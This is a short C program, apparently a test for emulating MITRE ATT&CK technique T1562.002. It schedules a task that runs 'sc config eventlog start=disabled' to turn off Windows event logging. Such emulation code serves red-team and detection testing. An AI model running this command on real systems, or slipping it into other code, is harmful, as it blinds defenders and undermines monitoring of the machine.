// Link      = https://attack.mitre.org/techniques/T1562/002/
// Technique = Impair Defenses: Disable Windows Event Logging
// ID        = T1562.002
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("sc config eventlog start=disabled");
    return 0;
}